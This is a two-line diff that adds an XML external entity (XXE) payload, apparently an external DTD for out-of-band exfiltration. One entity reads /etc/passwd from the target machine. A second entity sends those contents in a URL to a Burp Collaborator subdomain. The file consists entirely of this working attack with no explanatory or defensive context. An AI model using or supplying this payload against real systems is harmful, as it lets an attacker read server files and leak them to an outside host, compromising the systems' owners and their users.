@@ -1,0 +1,2 @@
+<!ENTITY % data SYSTEM "file:///etc/passwd">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://vrq80mv0q9ano438m6y70kngq7w6kv.burpcollaborator.net/?%data;'>">
